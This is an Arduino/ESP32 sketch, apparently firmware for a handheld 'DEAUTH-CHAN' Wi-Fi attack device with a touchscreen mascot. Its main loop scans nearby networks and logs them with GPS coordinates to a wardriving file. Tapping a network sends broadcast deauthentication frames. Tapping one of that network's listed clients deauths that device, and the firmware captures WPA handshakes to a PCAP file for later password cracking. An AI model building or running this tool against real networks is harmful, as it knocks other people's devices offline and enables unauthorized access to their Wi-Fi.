#include <Arduino.h>
#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <SD.h>
#include "config.h"
#include "Mascota.h"
#include "WiFiHunter.h"
#include "PCAPWriter.h"
#include "GPSModule.h"

TFT_eSPI tft = TFT_eSPI();
XPT2046_Touchscreen touch(TOUCH_CS, TOUCH_IRQ);

Mascota mascota;
WiFiHunter hunter;
PCAPWriter pcap;
GPSModule gps;

RedInfo redes[20];
int numRedes = 0;
unsigned long lastScanTime = 0;

bool scanning = false;
int redSeleccionada = -1;
bool mostrandoClientes = false;
unsigned long clientDisplayTime = 0;

ClienteInfo* clientes = nullptr;
int numClientes = 0;

void onHandshakeCaptured(const uint8_t* frame, uint32_t len) {
    uint32_t ts = millis();
    pcap.writePacket(frame, len, ts/1000, (ts%1000)*1000);
    mascota.incrementarHandshakes();
    Serial.printf("Handshake capturado! %d bytes\n", len);
}

void dibujarListaClientes() {
    tft.fillRect(0, 30, 240, 170, TFT_BLACK);
    tft.setTextColor(TFT_WHITE);
    tft.setTextSize(1);
    
    int y = 35;
    tft.setCursor(5, y);
    tft.println("Clientes encontrados:");
    y += 15;
    
    for (int i = 0; i < numClientes && i < 8; i++) {
        tft.setCursor(5, y);
        tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
            clientes[i].mac[0], clientes[i].mac[1], clientes[i].mac[2],
            clientes[i].mac[3], clientes[i].mac[4], clientes[i].mac[5]);
        tft.setCursor(140, y);
        tft.print(clientes[i].fabricante);
        y += 18;
    }
}

void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("DEAUTH-CHAN v1.0");
    
    pinMode(TFT_LED_PIN, OUTPUT);
    digitalWrite(TFT_LED_PIN, HIGH);
    
    tft.init();
    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);
    
    touch.begin();
    mascota.init(&tft);
    
    if (pcap.begin("deauth")) {
        Serial.println("PCAP iniciado");
    }
    
    gps.begin();
    hunter.begin();
    hunter.setHandshakeCallback(onHandshakeCaptured);
    
    Serial.println("Setup completado");
}

void loop() {
    gps.update();
    hunter.processPendingHandshakes();
    mascota.update();
    mascota.dibujar();
    
    // Si estamos mostrando la lista de clientes, la dibujamos
    if (mostrandoClientes && millis() - clientDisplayTime < 5000) {
        dibujarListaClientes();
        // Mostrar mensaje de ayuda
        tft.setTextColor(TFT_YELLOW);
        tft.setCursor(5, 180);
        tft.print("Toca un cliente para atacarlo");
        tft.setTextColor(TFT_WHITE);
    } else if (mostrandoClientes) {
        mostrandoClientes = false;
        // Limpiar la zona de clientes
        tft.fillRect(0, 30, 240, 170, TFT_BLACK);
        clientes = nullptr;
        numClientes = 0;
    }
    
    // --- Táctil ---
    if (touch.touched()) {
        TS_Point p = touch.getPoint();
        int x = map(p.x, 0, 4095, 0, 240);
        int y = map(p.y, 0, 4095, 0, 320);
        
        // Zona de clientes (si está activa)
        if (mostrandoClientes && y > 30 && y < 200) {
            int indice = (y - 35) / 18;
            if (indice >= 0 && indice < numClientes) {
                mascota.setEstado(ESTADO_ATTACK);
                hunter.deauth(redes[redSeleccionada], clientes[indice].mac, 30);
                Serial.printf("Atacando cliente: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    clientes[indice].mac[0], clientes[indice].mac[1],
                    clientes[indice].mac[2], clientes[indice].mac[3],
                    clientes[indice].mac[4], clientes[indice].mac[5]);
                delay(100);
                mascota.setEstado(ESTADO_IDLE);
            }
        }
        // Zona de redes (parte inferior)
        else if (mascota.getEstado() == ESTADO_IDLE && y > 200) {
            int indice = (y - 200) / 20;
            if (indice < numRedes) {
                redSeleccionada = indice;
                mascota.setEstado(ESTADO_ATTACK);
                
                // Primero atacamos por broadcast
                hunter.deauth(redes[redSeleccionada], nullptr, 30);
                
                // Luego escaneamos clientes de esa red
                hunter.scanClients(redes[redSeleccionada].bssid, redes[redSeleccionada].canal);
                clientes = hunter.getClientes(numClientes);
                
                if (numClientes > 0) {
                    mostrandoClientes = true;
                    clientDisplayTime = millis();
                    Serial.printf("Clientes encontrados: %d\n", numClientes);
                }
                
                delay(100);
                mascota.setEstado(ESTADO_IDLE);
            }
        }
        // Tocar la mascota
        else {
            mascota.tocar(x, y);
        }
    }
    
    // --- Escaneo de redes ---
    if (!scanning && millis() - lastScanTime > SCAN_INTERVAL) {
        mascota.setEstado(ESTADO_SCANNING);
        hunter.startScan();
        scanning = true;
    }
    
    if (scanning && hunter.isScanDone()) {
        hunter.getScanResults(redes, 20, numRedes);
        mascota.setRedesEncontradas(numRedes);
        
        GPSData pos = gps.getData();
        File csv = SD.open("/wardriving.csv", FILE_APPEND);
        if (csv) {
            for (int i = 0; i < numRedes; i++) {
                csv.printf("%s,%s,%02X:%02X:%02X:%02X:%02X:%02X,%d,%d,%.6f,%.6f,%.1f\n",
                    pos.valid ? pos.timestamp : "NO_FIX",
                    redes[i].ssid,
                    redes[i].bssid[0], redes[i].bssid[1], redes[i].bssid[2],
                    redes[i].bssid[3], redes[i].bssid[4], redes[i].bssid[5],
                    redes[i].rssi,
                    redes[i].canal,
                    pos.lat,
                    pos.lng,
                    pos.altitude
                );
            }
            csv.close();
        }
        
        mascota.setEstado(ESTADO_IDLE);
        scanning = false;
        lastScanTime = millis();
        Serial.printf("Escaneo completado: %d redes\n", numRedes);
    }
    
    delay(10);
}
